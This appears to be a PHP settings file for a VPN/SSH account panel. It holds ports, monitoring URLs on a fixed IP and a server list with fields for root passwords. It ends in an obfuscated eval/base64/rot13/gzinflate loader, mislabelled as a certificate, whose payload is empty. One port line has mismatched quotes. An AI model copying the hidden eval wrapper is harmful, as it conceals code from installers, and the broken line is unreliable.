<?php

/////////////////////////////
/////////////////////////////

//FILL UP ALL VARIABLE [ $ ] | BASE TO YOUR DESIRE://
$Nginx_Port= "81";	// Nginx Port
$site_name        = "Selamat Hari Raya IdulFitri 1442H";
$site_description = "Moho Maaf Lahir & Batin😊🙏";
$site_template    = "cyborg"; // (flatly, darkly, sketchy, lumen, cyborg, materia)
$site_ovpnmonitoring = "http://18.141.203.23:89"; // Openvpn Monitoring
$site_v2ray = "http://18.141.203.23:41414"; // v2ray ip and PORT
$site_config = "http://18.141.203.23:81/selamatharirayaidulfitri.html"; // list of config
$config_zips = "http://18.141.203.23:81/config.zip"; // ovpn zip check it on /home/vps/public_html
$daily_limit_user = "50"; // set daily limit

/////////////////////////////
/////////////////////////////

//Double Check if correct. Update anything not correct.
$port_ssh= 2277' | 40'; 		   	 // SSH Ports
$port_dropbear= '100 | 2770';  	 // Dropbear Ports
$port_ssl_dp= '200';                    	 // SSL through Dropbear
$port_ssl_ssh= '40';                    	 // SSL through OpenSSH
$port_ssl_ovpn= '400 | 300';                    	 // SSL through Openvpn
$port_squid= '8000 | 8080 | 9005';  // Squid Ports
$port_privoxy= '4000 | 3100'; 	 // Privoxy Ports
$port_ohp_sq= '5595 | 5596';  		 // OHP through Squid
$port_ohp_pr= '5597 | 5598';  		 // OHP through Privoxy
$port_ohp_ov= '5599';  				 // OHP through Openvpn
$port_psp_sim= '1000 | 22333';  		 // Python Simple Socks Proxy
$port_psp_dir= '2000 | 22444';  		 // Python Direct Socks Proxy
$port_psp_ov= '3000 | 22555';  		 // Python Openvpn Socks Proxy
$config_fog = "config.zip";				 // Zip File Name for your OVPN Config /Default: config.zip


/////////////////////////////  
/////////////////////////////
//  SHARPEN YOUR EYES!! READ PATTERN BELOW AND EDIT LINE 45,46,47,ETC
/* Server Data */
/* Variable = Server_Name, IP_Address, Root_Pass, Account_Validity */
/* Sample: 1=>array(1=>"Name of your Server 1","your-ip-address","server-or-root-password","5"), */

$server_lists_array=array(
			1=>array(1=>"VIP Server","34.101.150.36","server-or-root-password","5"),
			2=>array(1=>"Reserve 1 ","your-server-ip-2.here","server-or-root-password","5"),
			3=>array(1=>"Reserve 2","your-server-ip-3.here","server-or-root-password","5"),
	);			

/////////////////////////////
/////////////////////////////



//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
////////////// DONT EDIT CERTIFICATE BELOW  //////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////

eval(str_rot13(gzinflate(str_rot13(base64_decode('')))));
?>